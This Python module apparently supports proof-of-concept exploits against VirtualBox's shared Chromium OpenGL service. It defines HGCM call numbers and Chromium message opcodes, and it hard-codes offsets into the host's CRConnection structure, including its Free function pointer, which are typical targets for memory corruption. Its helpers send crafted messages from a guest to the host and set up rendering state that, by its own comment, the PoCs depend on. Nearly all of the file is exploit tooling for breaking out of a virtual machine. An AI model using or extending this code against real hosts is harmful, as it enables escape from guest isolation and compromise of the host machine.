from opcodes import *
from struct import pack, unpack

from hgcm import *


SHCRGL_GUEST_FN_WRITE = 2
SHCRGL_GUEST_FN_READ = 3
SHCRGL_GUEST_FN_WRITE_READ = 4
SHCRGL_GUEST_FN_SET_VERSION = 6
SHCRGL_GUEST_FN_INJECT = 9
SHCRGL_GUEST_FN_SET_PID = 12
SHCRGL_GUEST_FN_WRITE_BUFFER = 13
SHCRGL_GUEST_FN_WRITE_READ_BUFFERED = 14
SHCRGL_GUEST_FN_GET_CAPS_LEGACY = 15
SHCRGL_GUEST_FN_GET_CAPS_NEW = 16

CR_MESSAGE_OPCODES = 0x77474c01
CR_MESSAGE_WRITEBACK = 0x77474c02
CR_MESSAGE_ERROR = 0x77474c0b
CR_MESSAGE_REDIR_PTR = 0x77474c0d

OFFSET_CONN_CLIENT = 0x248   # p &((CRConnection*)0)->pClient
OFFSET_CONN_HOSTBUF = 0x238  # p &((CRConnection*)0)->pHostBuffer
OFFSET_CONN_HOSTBUFSZ = 0x244 # p &((CRConnection*)0)->cbHostBuffer
OFFSET_CONN_FREE = 0xd8 # p &((CRConnection*)0)->Free


def set_version(client):
    hgcm_call(client, SHCRGL_GUEST_FN_SET_VERSION, [9, 1])

def alloc_buf(client, sz, msg='a'):
    buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, sz, 0, msg])
    return buf

def crmsg(client, msg, bufsz=0x1000):
    ''' Allocate a buffer, write a Chromium message to it, and dispatch it. '''
    assert len(msg) <= bufsz
    buf = alloc_buf(client, bufsz, msg)
    # buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, bufsz, 0, msg])
    _, res, _ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf, "A"*bufsz, 1337])
    return res

def create_context(client):
    '''
    Initialize OpenGL state enough that we can use Chromium properly.
    The call to GLXMakeCurrent is important for some of the PoCs to work.
    '''
    msg = (
        pack("<III", 0x77474c01, 0x41414141, 1)
        + '\0\0\0' + chr(CR_EXTEND_OPCODE)
        + 'aaaa'
        + pack("<I", CR_CREATECONTEXT_EXTEND_OPCODE)
        + ':0'.ljust(256,'\0')
        + pack("<II", 0x25, 0)
        )
    res = crmsg(client, msg)
    ctx, = unpack("<I", res[24:28])

    msg = (
        pack("<III", 0x77474c01, 0x41414141, 1)
        + '\0\0\0' + chr(CR_EXTEND_OPCODE)
        + 'aaaa'
        + pack("<I", CR_WINDOWCREATE_EXTEND_OPCODE)
        + ':0'.ljust(256,'\0')
        + pack("<I", 0x25)
        )
    res = crmsg(client, msg)
    win, = unpack("<I", res[24:28])

    msg = (
        pack("<III", 0x77474c01, 0x41414141, 1)
        + '\0\0\0' + chr(CR_EXTEND_OPCODE)
        + 'aaaa'
        + pack("<I", CR_MAKECURRENT_EXTEND_OPCODE)
        + pack("<III", win, 0x400002, ctx)
        )
    crmsg(client, msg)

if __name__ == '__main__':
    client = hgcm_connect("VBoxSharedCrOpenGL")
    #set_version(client)
    pass